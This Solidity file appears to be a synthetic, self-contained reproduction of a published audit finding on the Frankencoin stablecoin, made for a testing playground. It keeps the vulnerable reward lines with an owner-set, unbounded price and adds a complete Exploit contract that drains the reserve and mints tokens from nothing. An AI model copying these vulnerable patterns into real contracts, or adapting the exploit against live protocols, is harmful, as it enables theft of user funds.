// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin (ZCHF) — [H-06] CHALLENGER_REWARD can be used to drain reserves
    and free-mint ZCHF (Code4rena 2023-04-frankencoin, finding #20021, reporter
    Emmanuel).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: MintingHub.end() pays the challenger a reward proportional to the
    position's *self-reported* liquidation `price`:

        volume = _mulD18(price, size)                 // Position.notifyChallengeSucceeded (L347)
        reward = (volume * CHALLENGER_REWARD) / 1000_000   // MintingHub.end (L265)

    `price` is fully owner-controlled and UNBOUNDED (Position.adjustPrice / the
    opening `_liqPrice` argument have no upper cap). By opening a position with a
    tiny collateral but an astronomically inflated price and then challenging it
    with itself, the attacker (who is also the challenger) walks away with a huge
    `reward` in ZCHF. When neither the position nor the bid covers `reward`,
    `Frankencoin.notifyLoss` first drains the whole reserve and then MINTS the
    shortfall from nothing — so the attacker both empties the reserve and
    free-mints ZCHF.

    The three blamed lines are copied VERBATIM and marked `// @> VULN:`; the
    surrounding contracts are reduced to the minimum needed for the reward path.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Verbatim MathUtil helper used by Position (fixed-point 18-dec multiply).
contract MathUtil {
    uint256 internal constant ONE_DEC18 = 10 ** 18;

    function _mulD18(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a * _b / ONE_DEC18;
    }

    function _divD18(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return (_a * ONE_DEC18) / _b;
    }
}

/// @notice Reduced Frankencoin (ZCHF) — an ERC20 whose minter (the MintingHub)
///         can mint, and whose `notifyLoss` covers protocol losses by first
///         draining the reserve and then minting the remainder. The reserve is
///         a distinct account (the Equity contract) holding a ZCHF balance.
contract Frankencoin {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    address public reserve; // the Equity contract; holds the minter reserve as ZCHF
    address public minter; // the MintingHub, the only address allowed to mint here

    function initialize(address _reserve, address _minter) external {
        require(reserve == address(0), "init");
        reserve = _reserve;
        minter = _minter;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    /// @dev Seed the reserve with ZCHF (stands in for equity/opening-fee inflows).
    function seedReserve(uint256 amount) external {
        _mint(reserve, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    /// @notice Verbatim reduction of Frankencoin.notifyLoss: pay `_amount` out of
    ///         the reserve, minting whatever the reserve cannot cover.
    function notifyLoss(uint256 _amount) external {
        require(msg.sender == minter, "not minter");
        uint256 reserveLeft = balanceOf[reserve];
        if (reserveLeft >= _amount) {
            _transfer(reserve, msg.sender, _amount);
        } else {
            _transfer(reserve, msg.sender, reserveLeft);
            _mint(msg.sender, _amount - reserveLeft); // free-mint the shortfall
        }
    }
}

/// @notice Reduced Frankencoin Position. Keeps the owner-controlled, UNBOUNDED
///         liquidation `price` and the verbatim `volumeZCHF` computation that
///         feeds the challenger reward.
contract Position is MathUtil {
    address public owner;
    address public immutable hub;
    uint256 public price; // ZCHF per unit collateral — owner-set, no upper bound
    uint256 public minted; // net minted amount
    uint256 public challengedAmount;
    uint32 public constant reserveContribution = 0;

    constructor(address _owner, address _hub, uint256 _liqPrice) {
        owner = _owner;
        hub = _hub;
        price = _liqPrice; // opening price is attacker-chosen (as in openPosition)
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    modifier onlyHub() {
        require(msg.sender == hub, "hub");
        _;
    }

    /// @notice Verbatim core of Position.adjustPrice — there is NO upper bound on
    ///         `newPrice`, so the owner can inflate it arbitrarily.
    function adjustPrice(uint256 newPrice) public onlyOwner {
        price = newPrice; // @> VULN: liquidation price is unbounded (Position.sol adjustPrice, L159)
    }

    function notifyChallengeStarted(uint256 size) external onlyHub {
        challengedAmount += size;
    }

    /// @notice Verbatim reduction of Position.notifyChallengeSucceeded. `volumeZCHF`
    ///         scales linearly with the unbounded `price`, and is returned to the
    ///         hub where it sizes the challenger reward.
    function notifyChallengeSucceeded(address _bidder, uint256 _bid, uint256 _size)
        external
        onlyHub
        returns (address, uint256, uint256, uint256, uint32)
    {
        challengedAmount -= _size;
        uint256 volumeZCHF = _mulD18(price, _size); // @> VULN: unbounded price -> unbounded volume (Position.sol:L347)
        // The owner does not have to repay (and burn) more than the owner actually minted.
        uint256 repayment = minted < volumeZCHF ? minted : volumeZCHF;
        if (repayment > minted) revert();
        minted -= repayment;
        // (collateral transfer to bidder is elided; no ERC20 collateral flow needed for the reward path)
        return (owner, _bid, volumeZCHF, repayment, reserveContribution);
    }
}

/// @notice Reduced MintingHub. Keeps the verbatim challenger-reward computation
///         and the notifyLoss branch that mints/drains to cover it.
contract MintingHub {
    uint32 public constant CHALLENGER_REWARD = 20000; // 2%

    Frankencoin public immutable zchf;

    struct Challenge {
        address challenger;
        Position position;
        uint256 size;
        uint256 end;
        address bidder;
        uint256 bid;
    }

    Challenge[] public challenges;

    constructor(Frankencoin _zchf) {
        zchf = _zchf;
    }

    /// @notice Launch a challenge on a position. `_challengeSeconds == 0` (as in the
    ///         finding) lets the attacker end it in the same block.
    function launchChallenge(Position position, uint256 _collateralAmount) external returns (uint256) {
        uint256 pos = challenges.length;
        challenges.push(Challenge(msg.sender, position, _collateralAmount, block.timestamp, address(0x0), 0));
        position.notifyChallengeStarted(_collateralAmount);
        return pos;
    }

    /// @notice Verbatim reduction of MintingHub.end for a challenge that ends
    ///         without an averting bid.
    function end(uint256 _challengeNumber) public {
        Challenge storage challenge = challenges[_challengeNumber];
        require(challenge.challenger != address(0x0));
        require(block.timestamp >= challenge.end, "period has not ended");
        address recipient = challenge.bidder == address(0x0) ? msg.sender : challenge.bidder;
        (address owner, uint256 effectiveBid, uint256 volume, uint256 repayment, uint32 reservePPM) =
            challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size);
        if (effectiveBid < challenge.bid) {
            zchf.transfer(challenge.bidder, challenge.bid - effectiveBid);
        }
        uint256 reward = (volume * CHALLENGER_REWARD) / 1000_000; // @> VULN: reward scales with attacker-set price (MintingHub.sol:L265)
        uint256 fundsNeeded = reward + repayment;
        if (effectiveBid > fundsNeeded) {
            zchf.transfer(owner, effectiveBid - fundsNeeded);
        } else if (effectiveBid < fundsNeeded) {
            zchf.notifyLoss(fundsNeeded - effectiveBid); // ensure we have enough to pay everything
        }
        zchf.transfer(challenge.challenger, reward); // pay out the challenger reward
        // zchf.burn(repayment, reservePPM); // repayment == 0 here (nothing minted), elided
        reservePPM;
        delete challenges[_challengeNumber];
    }
}

/// @dev Holds the minter reserve as a ZCHF balance (Frankencoin's Equity contract).
contract Equity {}

/// @notice Attacker orchestrator. Deploys the reduced Frankencoin system, seeds a
///         reserve, opens a position with a tiny challenge size but an inflated
///         liquidation price, self-challenges it, and ends the challenge to
///         collect a reward that drains the reserve and free-mints ZCHF.
contract Exploit is MathUtil {
    // A tiny "1 unit" collateral challenge size, but an astronomically inflated
    // liquidation price. reward = _mulD18(price, size) * 2% :
    //   volume = 1e24 * 1e18 / 1e18 = 1e24 ; reward = 1e24 * 20000 / 1_000_000 = 2e22 = 20_000 ZCHF.
    uint256 public constant HUGE_PRICE = 1e24;
    uint256 public constant CHALLENGE_SIZE = 1e18;
    uint256 public constant RESERVE_SEED = 5_000 ether; // reserve is far smaller than the reward
    uint256 public constant EXPECTED_REWARD = 20_000 ether;

    Frankencoin public zchf;
    Equity public equity;
    MintingHub public hub;
    Position public pos;

    constructor() {
        // Fixed, documented CREATE order (recorder keys addresses off this):
        zchf = new Frankencoin(); //   nonce 1
        equity = new Equity(); //      nonce 2 (reserve account)
        hub = new MintingHub(zchf); // nonce 3
        zchf.initialize(address(equity), address(hub));
        // Reserve is funded by equity/opening fees in the real system.
        zchf.seedReserve(RESERVE_SEED);
        // Open a position with a *normal* price; the attacker inflates it in run().
        pos = new Position(address(this), address(hub), 1e18); // nonce 4
    }

    function run() external {
        // 1. Inflate the liquidation price to an absurd value (unbounded).
        pos.adjustPrice(HUGE_PRICE);

        // 2. Launch a challenge on our own position (challenger == attacker).
        uint256 id = hub.launchChallenge(pos, CHALLENGE_SIZE);

        // 3. End the challenge immediately (challengeSeconds == 0). The hub pays
        //    us a reward sized by our inflated price, draining the reserve and
        //    minting the shortfall from nothing.
        hub.end(id);

        // HARM: the attacker/challenger received ~20_000 ZCHF for a 1-unit
        // position, the entire reserve was drained to zero, and the shortfall was
        // minted from thin air (totalSupply inflated by reward - reserveSeed).
        require(zchf.balanceOf(address(this)) == EXPECTED_REWARD, "reward not received");
        require(zchf.balanceOf(address(equity)) == 0, "reserve not drained");
        require(zchf.totalSupply() == EXPECTED_REWARD, "supply not inflated by free-mint");
    }
}
